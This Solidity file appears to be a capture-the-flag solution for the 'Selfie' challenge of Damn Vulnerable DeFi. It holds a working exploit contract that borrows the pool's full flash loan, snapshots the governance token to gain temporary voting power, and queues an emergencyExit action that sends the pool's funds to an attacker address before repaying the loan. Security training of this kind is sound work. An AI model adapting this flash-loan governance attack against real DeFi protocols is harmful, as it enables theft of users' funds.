// SPDX-License-Identifier: MIT
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

pragma solidity ^0.8.0;

contract AttackSelfiePool {
    SelfiePool private selfiePool;
    SimpleGovernance private simpleGovernance;
    DamnValuableTokenSnapshot private damnValuableTokenSnapshot;
    address payable attacker;

    constructor(
        address _selfiePool,
        address _simpleGovernance,
        address _damnValuableTokenSnapshot,
        address payable _attacker
    ) {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        damnValuableTokenSnapshot = DamnValuableTokenSnapshot(_damnValuableTokenSnapshot);
        attacker = _attacker;
    }

    function flashLoan() external {
        uint256 amountToBorrow = selfiePool.maxFlashLoan(address(damnValuableTokenSnapshot));
        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(selfiePool.token()), amountToBorrow, "");
    }

    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        damnValuableTokenSnapshot.snapshot();
        selfiePool.governance().queueAction(
            address(selfiePool), 0, abi.encodeWithSignature("emergencyExit(address)", attacker)
        );
        damnValuableTokenSnapshot.approve(address(selfiePool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
